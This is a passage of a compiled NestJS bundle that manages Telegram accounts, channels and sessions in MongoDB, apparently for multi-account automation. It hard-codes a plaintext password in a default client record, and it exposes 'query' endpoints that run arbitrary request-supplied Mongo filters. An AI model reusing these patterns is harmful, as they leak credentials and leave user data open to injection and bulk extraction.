    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "forbidden", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "private", void 0);


/***/ }),

/***/ "./src/components/active-channels/dto/update-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/update-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_active_channel_dto_1 = __webpack_require__(/*! ./create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
class UpdateActiveChannelDto extends (0, swagger_1.PartialType)(create_active_channel_dto_1.CreateActiveChannelDto) {
}
exports.UpdateActiveChannelDto = UpdateActiveChannelDto;


/***/ }),

/***/ "./src/components/active-channels/schemas/active-channel.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/schemas/active-channel.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelSchema = exports.ActiveChannel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
let ActiveChannel = class ActiveChannel {
};
exports.ActiveChannel = ActiveChannel;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false, default: null }),
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: utils_1.defaultMessages }),
    (0, mongoose_1.Prop)({ type: [String], default: utils_1.defaultMessages }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: utils_1.defaultReactions }),
    (0, mongoose_1.Prop)({
        type: [String], default: utils_1.defaultReactions
    }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "reactions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "forbidden", void 0);
exports.ActiveChannel = ActiveChannel = __decorate([
    (0, mongoose_1.Schema)({ collection: 'activeChannels', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ActiveChannel);
exports.ActiveChannelSchema = mongoose_1.SchemaFactory.createForClass(ActiveChannel);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.controller.ts":
/*!***********************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.controller.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const archived_client_service_1 = __webpack_require__(/*! ./archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ../clients/dto/create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ../clients/dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ../clients/dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
let ArchivedClientController = class ArchivedClientController {
    constructor(archivedclientService) {
        this.archivedclientService = archivedclientService;
    }
    async create(createClientDto) {
        return this.archivedclientService.create(createClientDto);
    }
    async search(query) {
        return this.archivedclientService.search(query);
    }
    async findAll() {
        return this.archivedclientService.findAll();
    }
    async checkArchivedClients() {
        return this.archivedclientService.checkArchivedClients();
    }
    async findOne(mobile) {
        return this.archivedclientService.findOne(mobile);
    }
    async fetchOne(mobile) {
        return this.archivedclientService.fetchOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.archivedclientService.update(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.archivedclientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.archivedclientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.ArchivedClientController = ArchivedClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID' }),
    (0, swagger_1.ApiQuery)({ name: 'dbcoll', required: false, description: 'Database collection name' }),
    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Channel link' }),
    (0, swagger_1.ApiQuery)({ name: 'link', required: false, description: 'Client link' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('checkArchivedClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "checkArchivedClients", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)('fetchOne/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "fetchOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "executeQuery", null);
exports.ArchivedClientController = ArchivedClientController = __decorate([
    (0, swagger_1.ApiTags)('Archived Clients'),
    (0, common_1.Controller)('archived-clients'),
    __metadata("design:paramtypes", [archived_client_service_1.ArchivedClientService])
], ArchivedClientController);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.module.ts":
/*!*******************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.module.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ../clients/schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const archived_client_service_1 = __webpack_require__(/*! ./archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const archived_client_controller_1 = __webpack_require__(/*! ./archived-client.controller */ "./src/components/archived-clients/archived-client.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let ArchivedClientModule = class ArchivedClientModule {
};
exports.ArchivedClientModule = ArchivedClientModule;
exports.ArchivedClientModule = ArchivedClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: client_schema_1.ClientSchema }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
        ],
        controllers: [archived_client_controller_1.ArchivedClientController],
        providers: [archived_client_service_1.ArchivedClientService],
        exports: [archived_client_service_1.ArchivedClientService]
    })
], ArchivedClientModule);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.service.ts":
/*!********************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.service.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let ArchivedClientService = class ArchivedClientService {
    constructor(archivedclientModel, telegramService, clientService) {
        this.archivedclientModel = archivedclientModel;
        this.telegramService = telegramService;
        this.clientService = clientService;
    }
    async create(createClientDto) {
        const createdUser = new this.archivedclientModel(createClientDto);
        return createdUser.save();
    }
    async findAll() {
        const results = await this.archivedclientModel.find().exec();
        return results;
    }
    async findOne(mobile) {
        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();
        return user;
    }
    async fetchOne(mobile) {
        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();
        if (user) {
            return user;
        }
        else {
            try {
                await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: true, handler: false });
                const newSession = await this.telegramService.createNewSession(mobile);
                return await this.create({
                    "channelLink": "default",
                    "clientId": "default",
                    "dbcoll": "default",
                    "deployKey": "default",
                    "link": "default",
                    "mainAccount": "default",
                    promoteRepl: "default",
                    "name": "default",
                    "password": "Ajtdmwajt1@",
                    "repl": "default",
                    "session": newSession,
                    "username": "default",
                    "mobile": mobile,
                    product: "default",
                    gpayId: "default",
                    promoteMobile: [],
                    qrId: "default",
                });
            }
            catch (e) {
                throw new common_1.NotFoundException((0, parseError_1.parseError)(e).message);
            }
            finally {
                await connection_manager_1.connectionManager.unregisterClient(mobile);
            }
        }
    }
    async update(mobile, updateClientDto) {
        delete updateClientDto["_id"];
        if (updateClientDto._doc) {
            delete updateClientDto._doc['_id'];
        }
        console.log({ ...updateClientDto });
        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();
        return updatedUser;
    }
    async remove(mobile) {
        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`Client with ID "${mobile}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.archivedclientModel.find(filter).exec();
    }
    async checkArchivedClients() {
        await connection_manager_1.connectionManager.disconnectAll();
        await (0, Helpers_1.sleep)(2000);
        const archivedClients = await this.findAll();
        const clients = await this.clientService.findAll();
        const clientIds = clients.map(client => client.mobile);
        archivedClients.map(async (document) => {
            if (!clientIds.includes(document.mobile)) {
                try {
                    await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });
                    await this.telegramService.updateUsername(document.mobile, '');
                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                    await (0, Helpers_1.sleep)(2000);
                }
                catch (error) {
                    console.log(document.mobile, " :  false");
                    this.remove(document.mobile);
                }
                finally {
                    await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                }
            }
            else {
                console.log("Number is a Active Client");
            }
        });
        return "Triggered ArchiveClients check";
    }
    async executeQuery(query) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            return await this.archivedclientModel.find(query).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.ArchivedClientService = ArchivedClientService;
exports.ArchivedClientService = ArchivedClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('ArchivedArchivedClientsModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], ArchivedClientService);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.controller.ts":
/*!*******************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.controller.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./dto/create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
const search_buffer__client_dto_1 = __webpack_require__(/*! ./dto/search-buffer- client.dto */ "./src/components/buffer-clients/dto/search-buffer- client.dto.ts");
const update_buffer_client_dto_1 = __webpack_require__(/*! ./dto/update-buffer-client.dto */ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts");
let BufferClientController = class BufferClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async joinChannelsforBufferClients() {
        return this.clientService.joinchannelForBufferClients();
    }
    async checkbufferClients() {
        this.clientService.checkBufferClients();
        return "initiated Checking";
    }
    async addNewUserstoBufferClients(body) {
        this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);
        return "initiated Checking";
    }
    async findAll() {
        return this.clientService.findAll();
    }
    async setAsBufferClient(mobile) {
        return await this.clientService.setAsBufferClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.clientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.BufferClientController = BufferClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_buffer_client_dto_1.CreateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_buffer__client_dto_1.SearchBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('joinChannelsForBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for BufferClients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "joinChannelsforBufferClients", null);
__decorate([
    (0, common_1.Get)('checkBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Buffer Clients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "checkbufferClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Buffer Clients' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "addNewUserstoBufferClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsBufferClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Buffer Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "setAsBufferClient", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "executeQuery", null);
exports.BufferClientController = BufferClientController = __decorate([
    (0, swagger_1.ApiTags)('Buffer Clients'),
    (0, common_1.Controller)('bufferclients'),
    __metadata("design:paramtypes", [buffer_client_service_1.BufferClientService])
], BufferClientController);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.module.ts":
/*!***************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.module.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const buffer_client_controller_1 = __webpack_require__(/*! ./buffer-client.controller */ "./src/components/buffer-clients/buffer-client.controller.ts");
const buffer_client_schema_1 = __webpack_require__(/*! ./schemas/buffer-client.schema */ "./src/components/buffer-clients/schemas/buffer-client.schema.ts");
